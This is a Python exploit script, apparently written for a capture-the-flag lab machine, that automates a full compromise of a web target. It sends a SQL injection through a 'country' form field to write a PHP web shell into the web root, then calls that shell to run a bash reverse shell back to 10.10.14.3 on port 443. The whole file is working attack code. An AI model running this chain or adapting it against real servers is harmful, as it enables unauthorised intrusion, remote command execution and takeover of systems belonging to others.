#!/usr/bin/python3

from pwn import *
import requests 
import signal, pdb 

def def_handler(sig, frame):

    print("\n\n[!] Exiting python autoPwn_validation script...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 3:
    log.failure("Usage: %s <ip-address> filename" % sys.argv[0])
    sys.exit(1)

# Global Variables
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address

#pdb.set_trace()

def createFile():
    data_post = {
        'username': 'tom',
        'country': """Chad' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -""" % filename
    }
    r = requests.post(main_url, data=data_post)
    #pdb.set_trace()
def getAccess():
    data_post = {
        'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'"
    }
    r = requests.post(main_url + "%s" % filename, data=data_post)




if __name__ == '__main__':
    createFile()
    getAccess()